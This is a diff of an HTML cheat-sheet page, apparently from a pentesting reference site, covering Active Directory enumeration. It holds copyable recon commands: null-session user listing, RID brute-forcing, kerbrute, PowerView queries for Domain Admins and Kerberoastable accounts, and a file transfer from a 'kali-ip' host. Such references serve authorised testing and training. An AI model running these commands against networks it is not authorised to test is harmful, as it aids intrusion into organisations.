@@ -61,11 +61,10 @@
     <a href="pivoting.html">🔀 Pivoting</a>
 
     <a href="ad-enumeration.html" class="active">🧩 AD Enumeration</a>
-    <a href="ad-attacks.html">⚔️ AD Attacks</a>
-    <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
+  <a href="ad-attacks.html">⚔️ AD Attacks I</a>
+    <a href="ad-attacks2.html">⚔️ AD Attacks II</a>
 
-    <a href="cloud-security.html">☁️ Cloud</a>
-
+  <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
   </nav>
 
 </aside>
@@ -89,54 +88,50 @@
     </div>
     <div class="section">
 
-        <h2>Basic Domain Enumeration</h2>
 
 <!-- ================= LDAP BÁSICO ================= -->
 <h3>LDAP Search</h3>
 <p>Retrieve potential user, computer, and domain structure information from LDAP.</p>
-<pre><code>ldapsearch -x -H ldap://$dc-ip -b "dc=domain,dc=com"</code>
-<button class="copy-btn" data-copy='ldapsearch -x -H ldap://$dc-ip -b "dc=domain,dc=com"'>COPY</button>
+<pre><code>ldapsearch -x -H ldap://&lt;DC-IP&gt; -b "dc=domain,dc=com"</code>
+<button class="copy-btn" data-copy='ldapsearch -x -H ldap://&lt;DC-IP&gt; -b "dc=domain,dc=com"'>COPY</button>
 </pre>
 
 <!-- ================= ENUM DNS ================= -->
 <h3>Enumerate DNS</h3>
-<p>Gather information about key servers and subdomains within the domain.</p>
-<pre><code>gobuster dns -d domain.com -t 25 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top2000.txt</code>
-<button class="copy-btn" data-copy='gobuster dns -d domain.com -t 25 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top2000.txt'>COPY</button>
-</pre>
+<a class="code-link" href="enumeration.html#dns-enum">Go to DNS</a>
+
 
 <!-- ================= SMB LINK ================= -->
 <h3>SMB Shares</h3>
-<p>Enumerate SMB services and accessible shared resources.</p>
-<a class="code-link" href="enumeration.html#smb-enum">Go to SMB / Host Enumeration</a>
+<a class="code-link" href="enumeration.html#smb-enum">Go to SMB</a>
 
 <!-- ================= LDAP SERVICES ================= -->
 <h3>LDAP Services Scan</h3>
-<p>Identify exposed LDAP services and supported capabilities.</p>
-<pre><code>nmap -n -sV --script "ldap* and not brute" -p 389 $dc-ip</code>
-<button class="copy-btn" data-copy='nmap -n -sV --script "ldap* and not brute" -p 389 $dc-ip'>COPY</button>
+<pre><code>nmap -n -sV --script "ldap* and not brute" -p 389 &lt;DC-IP&gt;</code>
+<button class="copy-btn" data-copy='nmap -n -sV --script "ldap* and not brute" -p 389 &lt;DC-IP&gt;'>COPY</button>
 </pre>
-
 <!-- ================= USER ENUM ================= -->
-<h3>Find Valid Users</h3>
-<p>Enumerate valid domain users without authentication.</p>
+<!-- ================= USER ENUM ================= -->
+</div>
+<div class="section">
+<h2>Find Valid Users (No Authenticated)</h2>
 
-<pre><code>crackmapexec smb domain.com -u '' -p '' --users</code>
-<button class="copy-btn" data-copy="crackmapexec smb domain.com -u '' -p '' --users">COPY</button>
+<pre>
+  <code>crackmapexec smb domain.com -u '' -p '' --users</code>
+  <button class="copy-btn" data-copy="crackmapexec smb domain.com -u '' -p '' --users">COPY</button>
 </pre>
 
-<pre><code>kerbrute userenum -d domain.com users.txt --dc dc-ip -o valid_users.txt</code>
-<button class="copy-btn" data-copy="kerbrute userenum -d domain.com users.txt --dc dc-ip -o valid_users.txt">COPY</button>
+<pre>
+  <code>crackmapexec smb domain.com -u 'guest' -p '' --users</code>
+  <button class="copy-btn" data-copy="crackmapexec smb domain.com -u 'guest' -p '' --users">COPY</button>
 </pre>
 
-<!-- ================= USERNAME ANARCHY ================= -->
-<h4>Tool: Username-Anarchy</h4>
-<p>Generates possible usernames using common enterprise naming conventions.</p>
-<a class="code-link" href="https://github.com/urbanadventurer/username-anarchy" target="_blank">GitHub Repository</a>
+
+
+
 
 <!-- ================= AUTH ENUM ================= -->
-<h3>Enumerate All AD Users (Authenticated)</h3>
-<p>Enumerate full Active Directory users once valid credentials are obtained.</p>
+<h2>Enumerate All AD Users (Authenticated)</h2>
 
 <pre><code>impacket-GetADUsers -all -dc-ip dc-ip -u username -p password domain.com</code>
 <button class="copy-btn" data-copy="impacket-GetADUsers -all -dc-ip dc-ip -u username -p password domain.com">COPY</button>
@@ -146,108 +141,113 @@
 <button class="copy-btn" data-copy="enum4linux -a -u username -p password dc-ip">COPY</button>
 </pre>
 
-<!-- ================= DNS VIA AD ================= -->
-<h3>Enumerating AD via DNS</h3>
-<p>Discover domain-related DNS records and services.</p>
+</div>
+<!-- ================= RID CYCLING (CME) ================= -->
+ <div class="section">
 
-<pre><code>nmap -p 53 --script "dns-nsid,dns-srv-enum" target-ip</code>
-<button class="copy-btn" data-copy='nmap -p 53 --script "dns-nsid,dns-srv-enum" target-ip'>COPY</button>
+<h2>RID Cycling (CrackMapExec)</h2>
+
+<pre>
+  <code>crackmapexec smb domain.com -u '' -p '' --rid-brute</code>
+  <button class="copy-btn" data-copy="crackmapexec smb domain.com -u '' -p '' --rid-brute">COPY</button>
 </pre>
 
-<h4>Zone Transfer</h4>
-<p>Attempts to retrieve full DNS zone data via AXFR transfer.</p>
-
-<pre><code>dnsrecon -d domain.com -n dns-server-ip -t axfr</code>
-<button class="copy-btn" data-copy="dnsrecon -d domain.com -n dns-server-ip -t axfr">COPY</button>
+<pre>
+  <code>crackmapexec smb domain.com -u 'guest' -p '' --rid-brute</code>
+  <button class="copy-btn" data-copy="crackmapexec smb domain.com -u 'guest' -p '' --rid-brute">COPY</button>
 </pre>
 
-<pre><code>dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver dns-server-ip domain.com</code>
-<button class="copy-btn" data-copy="dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver dns-server-ip domain.com">COPY</button>
+<!-- ================= RID CYCLING (LOOKUPSID) ================= -->
+<h2>RID Cycling (lookupsid)</h2>
+
+<pre>
+  <code>lookupsid.py domain.com/''@dc-ip</code>
+  <button class="copy-btn" data-copy="lookupsid.py domain.com/''@dc-ip">COPY</button>
 </pre>
 
-<h4>DNS Record Lookup</h4>
-<p>Queries specific DNS records such as A and SRV records.</p>
-
-<pre><code>dig A domain.com @dc-ip</code>
-<button class="copy-btn" data-copy="dig A domain.com @dc-ip">COPY</button>
+<pre>
+  <code>lookupsid.py domain.com/guest@dc-ip</code>
+  <button class="copy-btn" data-copy="lookupsid.py domain.com/guest@dc-ip">COPY</button>
 </pre>
 
-<pre><code>dig SRV _ldap._tcp.dc._msdcs.domain.com @dc-ip</code>
-<button class="copy-btn" data-copy="dig SRV _ldap._tcp.dc._msdcs.domain.com @dc-ip">COPY</button>
+<pre>
+  <code>lookupsid.py domain.com/user:password@dc-ip</code>
+  <button class="copy-btn" data-copy="lookupsid.py domain.com/user:password@dc-ip">COPY</button>
+</pre>
+</div>
+
+<!-- ================= USERNAME ANARCHY ================= -->
+  <div class="section">
+
+<h2>Username Generation</h2>
+
+<pre>
+  <code>username-anarchy --input names.txt --select-format first.last</code>
+  <button class="copy-btn" data-copy="username-anarchy --input names.txt --select-format first.last">COPY</button>
 </pre>
 
-<h4>Reverse Lookup</h4>
-<p>Resolves IP addresses to hostnames via reverse DNS queries.</p>
+<a class="code-link" href="https://github.com/urbanadventurer/username-anarchy" target="_blank">
+  GitHub Repository
+</a>
 
-<pre><code>nmap -sL target-ip-range | grep "Nmap scan report"</code>
-<button class="copy-btn" data-copy='nmap -sL target-ip-range | grep "Nmap scan report"'>COPY</button>
+<!-- ================= KERBEROS USER ENUM ================= -->
+<h3>Validating Users through Kerberos</h3>
+
+<pre>
+  <code>kerbrute userenum -d domain.com users.txt --dc dc-ip -o valid_users.txt</code>
+  <button class="copy-btn" data-copy="kerbrute userenum -d domain.com users.txt --dc dc-ip -o valid_users.txt">COPY</button>
 </pre>
 
-<h4>DNS Cache Snooping</h4>
-<p>Checks cached DNS entries stored on the DNS server.</p>
+</div>
+<div class="section">
+<h2>Enumerating System</h2>
+<h3>My Domain SID</h3>
 
-<pre><code>dig @dns-server-ip -t A +norecurse target-domain</code>
-<button class="copy-btn" data-copy="dig @dns-server-ip -t A +norecurse target-domain">COPY</button>
-</pre>
-
-<h4>Enumerate DNS with PowerShell (Windows)</h4>
-<p>Queries DNS records directly from a Windows system.</p>
-
-<pre><code>Resolve-DnsName -Name domain.com -Server dns-server-ip -DnsOnly</code>
-<button class="copy-btn" data-copy="Resolve-DnsName -Name domain.com -Server dns-server-ip -DnsOnly">COPY</button>
-</pre>
-
-<!-- ================= DOMAIN & SID ENUM ================= -->
-<h3>Find My Domain SID</h3>
-
-<h4>Using PowerShell</h4>
-<p>Retrieves the unique Security Identifier of the domain.</p>
 <pre><code>(Get-ADDomain).DomainSID</code>
 <button class="copy-btn" data-copy="(Get-ADDomain).DomainSID">COPY</button>
 </pre>
-
-<h4>Using CMD</h4>
-<p>Displays the SID of the currently logged-in user.</p>
 <pre><code>whoami /user</code>
 <button class="copy-btn" data-copy="whoami /user">COPY</button>
 </pre>
-
-<h4>Using WMIC</h4>
-<p>Queries the SID of a specific local or domain user.</p>
 <pre><code>wmic useraccount where name='usernameToFind' get sid</code>
 <button class="copy-btn" data-copy="wmic useraccount where name='usernameToFind' get sid">COPY</button>
 </pre>
-
-<!-- ================= DOMAIN CONTROLLER ENUM ================= -->
 <h3>Find Domain Controller Name</h3>
 
-<h4>Using PowerShell</h4>
-<p>Lists all available domain controllers in the domain.</p>
 <pre><code>Get-ADDomainController -Filter *</code>
 <button class="copy-btn" data-copy="Get-ADDomainController -Filter *">COPY</button>
 </pre>
 
-<h4>Using nltest</h4>
-<p>Enumerates domain controllers using NetLogon service.</p>
 <pre><code>nltest /dclist:yourdomain.com</code>
 <button class="copy-btn" data-copy="nltest /dclist:yourdomain.com">COPY</button>
 </pre>
 
-<h4>Using netdom</h4>
-<p>Queries domain controller roles and availability.</p>
 <pre><code>netdom query dc</code>
 <button class="copy-btn" data-copy="netdom query dc">COPY</button>
 </pre>
 
-<h4>Using nslookup</h4>
-<p>Resolves domain name to associated DNS servers.</p>
 <pre><code>nslookup yourdomain.com</code>
 <button class="copy-btn" data-copy="nslookup yourdomain.com">COPY</button>
 </pre>
+<h3>Check Domain Users</h3>
 
-<h4>Using ADUC</h4>
-<p>Manually identifies domain controllers through graphical Active Directory tools.</p>
+<pre><code>net user /domain</code>
+<button class="copy-btn" data-copy="net user /domain">COPY</button>
+</pre>
 
+<pre><code>net user username /domain</code>
+<button class="copy-btn" data-copy="net user username /domain">COPY</button>
+</pre>
+
+<h3>Check Domain Groups</h3>
+
+<pre><code>net groups /domain</code>
+<button class="copy-btn" data-copy="net groups /domain">COPY</button>
+</pre>
+
+<pre><code>net groups groupName /domain</code>
+<button class="copy-btn" data-copy="net groups groupName /domain">COPY</button>
+</pre>
 <!-- ================= SERVICE ACCOUNTS ================= -->
 <h3>Find Service Account Names</h3>
 
@@ -384,198 +384,95 @@
 <button class="copy-btn" data-copy="Get-ADComputer -Filter * -Properties ServicePrincipalName | Select-Object -ExpandProperty ServicePrincipalName">COPY</button>
 </pre>
 
-<h4>Bash (Kali)</h4>
+<h4>Bash (BlackArch)</h4>
 <p>Queries LDAP directly for computer objects with SPNs.</p>
 <pre><code>ldapsearch -x -h DC_IP -b "DC=domain,DC=com" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName</code>
 <button class="copy-btn" data-copy='ldapsearch -x -h DC_IP -b "DC=domain,DC=com" "(&(objectClass=computer)(servicePrincipalName=*))" servicePrincipalName'>COPY</button>
 </pre>
 
-<!-- ================= USERS & GROUPS ================= -->
-<h3>Check Domain Users</h3>
-<p>Lists all users within the domain.</p>
-
-<pre><code>net user /domain</code>
-<button class="copy-btn" data-copy="net user /domain">COPY</button>
-</pre>
-
-<pre><code>net user username /domain</code>
-<button class="copy-btn" data-copy="net user username /domain">COPY</button>
-</pre>
-
-<h3>Check Domain Groups</h3>
-<p>Enumerates domain groups and their members.</p>
-
-<pre><code>net groups /domain</code>
-<button class="copy-btn" data-copy="net groups /domain">COPY</button>
-</pre>
-
-<pre><code>net groups groupName /domain</code>
-<button class="copy-btn" data-copy="net groups groupName /domain">COPY</button>
-</pre>
-
-<!-- ================= LDAP SCRIPTS ================= -->
-<h3>LDAP Helper Scripts</h3>
-
-<h4>Get Full LDAP Path</h4>
-<p>Builds the full LDAP distinguished name path dynamically.</p>
-<pre><code>$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
-$DN=([adsi]'').distinguishedName
-"LDAP://$PDC/$DN"</code>
-<button class="copy-btn" data-copy="$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name&#10;$DN=([adsi]'').distinguishedName&#10;LDAP://$PDC/$DN">COPY</button>
-</pre>
-
-<h4>Get SAM Account Info</h4>
-<p>Enumerates user accounts using specific SAM account types.</p>
-<pre><code>function Get-SAMInfo {
-$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
-$DN=([adsi]'').distinguishedName
-$LDAP="LDAP://$PDC/$DN"
-$direntry=New-Object System.DirectoryServices.DirectoryEntry($LDAP)
-$dirsearcher=New-Object System.DirectoryServices.DirectorySearcher($direntry)
-$dirsearcher.filter="samAccountType=805306368"
-$dirsearcher.FindAll() | ForEach-Object { $_.Properties }
-}</code>
-<button class="copy-btn" data-copy="function Get-SAMInfo {&#10;$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name&#10;$DN=([adsi]'').distinguishedName&#10;$LDAP=&quot;LDAP://$PDC/$DN&quot;&#10;$direntry=New-Object System.DirectoryServices.DirectoryEntry($LDAP)&#10;$dirsearcher=New-Object System.DirectoryServices.DirectorySearcher($direntry)&#10;$dirsearcher.filter=&quot;samAccountType=805306368&quot;&#10;$dirsearcher.FindAll() | ForEach-Object { $_.Properties }&#10;}">COPY</button>
-</pre>
-
-<h4>LDAP Search Function</h4>
-<p>Wraps LDAP queries into a reusable PowerShell function.</p>
-<pre><code>function LDAPSearch {
-param ([string]$LDAPQuery)
-$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
-$DN=([adsi]'').distinguishedName
-$DE=New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DN")
-$DS=New-Object System.DirectoryServices.DirectorySearcher($DE,$LDAPQuery)
-$DS.FindAll()
-}</code>
-<button class="copy-btn" data-copy="function LDAPSearch {&#10;param ([string]$LDAPQuery)&#10;$PDC=[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name&#10;$DN=([adsi]'').distinguishedName&#10;$DE=New-Object System.DirectoryServices.DirectoryEntry(&quot;LDAP://$PDC/$DN&quot;)&#10;$DS=New-Object System.DirectoryServices.DirectorySearcher($DE,$LDAPQuery)&#10;$DS.FindAll()&#10;}">COPY</button>
-</pre>
-
-<h4>LDAP Queries</h4>
-<p>Executes custom LDAP filters for users and groups.</p>
-
-<pre><code>LDAPSearch -LDAPQuery "(samAccountType=805306368)"</code>
-<button class="copy-btn" data-copy='LDAPSearch -LDAPQuery "(samAccountType=805306368)"'>COPY</button>
-</pre>
-
-<pre><code>LDAPSearch -LDAPQuery "(objectclass=group)"</code>
-<button class="copy-btn" data-copy='LDAPSearch -LDAPQuery "(objectclass=group)"'>COPY</button>
-</pre>
-
-<pre><code>foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.Properties | Select-Object {$_.cn}, {$_.member} }</code>
-<button class="copy-btn" data-copy='foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.Properties | Select-Object {$_.cn}, {$_.member} }'>COPY</button>
-</pre>
-
 </div>
 
 
-    <div class="section">
-<h2>PowerView Enumeration</h2>
 
-<!-- ================= DOWNLOAD ================= -->
+  <div class="section">
+<h2>Powerview</h2>
 <h3>Download PowerView.ps1</h3>
-<p>Download PowerView script to perform advanced Active Directory enumeration.</p>
 <a class="code-link" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1" target="_blank">
 Download PowerView.ps1
 </a>
-
-<!-- ================= IMPORT ================= -->
 <h3>Import PowerView Module</h3>
-<p>Loads PowerView functions into the current PowerShell session.</p>
+
 <pre><code>Import-Module .\PowerView.ps1</code>
 <button class="copy-btn" data-copy="Import-Module .\PowerView.ps1">COPY</button>
 </pre>
-
-<!-- ================= DOMAIN INFO ================= -->
 <h3>Get Domain Information</h3>
-<p>Retrieves basic information about the current Active Directory domain.</p>
 <pre><code>Get-NetDomain</code>
 <button class="copy-btn" data-copy="Get-NetDomain">COPY</button>
 </pre>
-
-<!-- ================= DOMAIN NAME ================= -->
 <h3>Find Domain Name</h3>
-<p>Discovers the domain name using domain controller discovery.</p>
 <pre><code>Get-ADDomainController -Discover</code>
 <button class="copy-btn" data-copy="Get-ADDomainController -Discover">COPY</button>
 </pre>
 
-<!-- ================= DOMAIN USERS ================= -->
+
 <h3>Get Domain Users</h3>
-<p>Enumerates all user accounts present in the Active Directory domain.</p>
 <pre><code>Get-NetUser</code>
 <button class="copy-btn" data-copy="Get-NetUser">COPY</button>
 </pre>
 
 <h3>User Detailed Information</h3>
-<p>Extracts specific attributes from domain user objects.</p>
 <pre><code>Get-NetUser | Select-Object [attributes]</code>
 <button class="copy-btn" data-copy="Get-NetUser | Select-Object [attributes]">COPY</button>
 </pre>
 
-<!-- ================= GROUP INFO ================= -->
+
 <h3>Group Information</h3>
-<p>Enumerates domain groups and their associated attributes.</p>
 <pre><code>Get-NetGroup | Select-Object [attributes]</code>
 <button class="copy-btn" data-copy="Get-NetGroup | Select-Object [attributes]">COPY</button>
 </pre>
-
-<!-- ================= COMPUTER INFO ================= -->
 <h3>Operating System Information</h3>
-<p>Lists domain computers including operating system details.</p>
 <pre><code>Get-NetComputer | Select-Object [attributes]</code>
 <button class="copy-btn" data-copy="Get-NetComputer | Select-Object [attributes]">COPY</button>
 </pre>
 
-<!-- ================= DOMAIN ADMINS ================= -->
+
 <h3>Get Domain Admins</h3>
-<p>Identifies members of the Domain Admins privileged group.</p>
 <pre><code>Get-NetGroup -GroupName "Domain Admins"</code>
 <button class="copy-btn" data-copy='Get-NetGroup -GroupName "Domain Admins"'>COPY</button>
 </pre>
 
 <!-- ================= KERBEROAST ================= -->
 <h3>Find Kerberoastable Accounts</h3>
-<p>Finds user accounts with SPNs vulnerable to Kerberoasting attacks.</p>
 <pre><code>Get-NetUser -SPN</code>
 <button class="copy-btn" data-copy="Get-NetUser -SPN">COPY</button>
 </pre>
 
 <!-- ================= DOMAIN CONTROLLERS ================= -->
 <h3>Enumerate Domain Controllers</h3>
-<p>Lists all domain controllers within the Active Directory environment.</p>
 <pre><code>Get-NetDomainController</code>
 <button class="copy-btn" data-copy="Get-NetDomainController">COPY</button>
 </pre>
 
 <!-- ================= SHARES ================= -->
 <h3>Find Network Shares</h3>
-<p>Enumerates shared folders available across domain systems.</p>
 <pre><code>Get-NetShare</code>
 <button class="copy-btn" data-copy="Get-NetShare">COPY</button>
 </pre>
-
-<!-- ================= DELEGATION ================= -->
 <h3>Check for Delegation</h3>
-<p>Identifies accounts configured with Kerberos delegation permissions.</p>
 <pre><code>Get-NetUser -Delegation</code>
 <button class="copy-btn" data-copy="Get-NetUser -Delegation">COPY</button>
 </pre>
-    </div>
+   
 
-    <div class="section">
-      <h2>Service Principal Names Enumeration</h2>
 
-      
-    List SPN linked to a user:
+</div>
 
-setspn -L [service]
 
-    List SPN accounts in the domain:
 
-Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
 
-    </div>
+
+
+
 
 <div class="section">
   <h2>Object Permissions Enumeration</h2>
@@ -755,38 +652,9 @@ Get-NetUser -SPN | Select-Object samaccountname, serviceprincipalname
   <button class="copy-btn" data-copy='Invoke-WebRequest -Uri "http://kali-ip/upload/path" -OutFile "C:\Temp\bloodhound.zip"'>COPY</button>
   </pre>
 
-  <!-- ================= BLOODHOUND KALI ================= -->
-  <h3>Run BloodHound on Kali</h3>
-  <p>Starts Neo4j and BloodHound interface to analyze collected Active Directory data.</p>
-
-  <pre><code>sudo neo4j start</code>
-  <button class="copy-btn" data-copy="sudo neo4j start">COPY</button>
-  </pre>
-
-  <pre><code>bloodhound</code>
-  <button class="copy-btn" data-copy="bloodhound">COPY</button>
-  </pre>
-
-  <p>Access Neo4j at <strong>https://localhost:7474</strong> using default credentials <strong>neo4j:neo4j</strong>.</p>
-  <p>Import the collected <strong>.zip</strong> files into BloodHound.</p>
 
 </div>
 
-    <div class="section">
-      <h2>Group Policy Preferences Passwords</h2>
-    </div>
-
-    <div class="section">
-      <h2>AD Enumeration Strategy</h2>
-      <ul>
-        <li>Start unauthenticated</li>
-        <li>Reuse credentials aggressively</li>
-        <li>Graph everything with BloodHound</li>
-        <li>Every permission is an attack path</li>
-      </ul>
-    </div>
-
-  </div>
 </main>
 
 </div>
